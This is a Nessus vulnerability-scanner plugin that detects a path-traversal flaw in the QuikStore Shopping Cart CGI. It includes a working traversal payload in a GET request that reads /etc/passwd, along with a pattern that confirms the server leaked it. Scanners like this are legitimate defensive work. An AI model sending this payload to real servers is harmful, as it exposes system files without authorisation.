#
# (C) Tenable Network Security, Inc.
#

# Ref:
# Date: Tue, 23 Dec 2003 20:27:51 +0800
# From: Dr`Ponidi Haryanto <drponidi@hackermail.com>
# Subject: QuikStore Shopping Cart Discloses Installation Path & Files to Remote


include("compat.inc");

if(description)
{
 script_id(11975);
 script_version ("$Revision: 1.14 $");
 script_cvs_date("$Date: 2013/01/25 01:19:09 $");

# script_bugtraq_id(9282);  # Incidentally covers bid 9282 
 script_osvdb_id(15389);
 
 script_name(english:"QuikStore Shopping Cart quikstore.cgi template Parameter Traversal Arbitrary File Access");
 script_summary(english:"Checks for the presence of /cgi-bin/quickstore.cgi");
 
 script_set_attribute(attribute:"synopsis", value:
"Arbitrary files can be read on the remote server." );
 script_set_attribute(attribute:"description", value:
"The CGI 'quickstore.cgi' is installed. This CGI has a well known 
security flaw that lets an attacker read arbitrary files with the
privileges of the HTTP daemon." );
 script_set_attribute(attribute:"solution", value:
"Remove it from /cgi-bin or upgrade to the latest version." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");

 script_set_attribute(attribute:"plugin_publication_date", value: "2004/01/01");
 script_set_attribute(attribute:"vuln_publication_date", value: "2003/12/24");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();
 
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2004-2013 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

foreach dir (cgi_dirs())
{
req = string(dir,
 "/quickstore.cgi?nessus&template=../../../../../../../../../../etc/passwd%00html");
r = http_send_recv3(method: "GET", item:req, port:port);
if (isnull(r)) exit(0);
if (egrep(pattern:".*root:.*:0:[01]:.*", string: r[0]+r[1]+r[2]))
{
 security_warning(port, extra: 
strcat('\nThe following URL exhibits the flaw :\n', build_url(port: port, qs: req)));
 exit(0);
}
}
